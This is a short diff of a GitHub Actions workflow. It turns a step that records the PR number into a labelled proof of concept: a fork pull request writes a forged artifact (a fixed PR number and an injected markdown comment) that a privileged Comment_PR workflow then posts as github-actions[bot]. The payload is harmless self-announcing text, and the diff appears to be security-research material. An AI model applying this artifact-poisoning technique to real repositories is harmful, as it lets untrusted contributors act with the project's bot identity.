@@ -1,14 +1,22 @@
+# re-trigger
 name: Test_Change
 on: pull_request
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Record PR number
+      - name: Forge PR comments artifact
         run: |
           mkdir -p pr-comments
-          echo "${{ github.event.number }}" > pr-comments/pr-number.txt
-          echo "Benign test output for PR ${{ github.event.number }}" > pr-comments/result.md
+          echo "1" > pr-comments/pr-number.txt
+          {
+            echo "### GAB PoC - forged workflow_run artifact"
+            echo ""
+            echo "This comment was written by an unprivileged fork-PR author and posted"
+            echo "by the privileged Comment_PR workflow as github-actions[bot] on PR #1."
+            echo ""
+            echo "Run: ${GITHUB_RUN_ID} / actor: ${GITHUB_ACTOR}"
+          } > pr-comments/injected.md
       - name: Upload PR comments artifact
         if: always()
         uses: actions/upload-artifact@v4
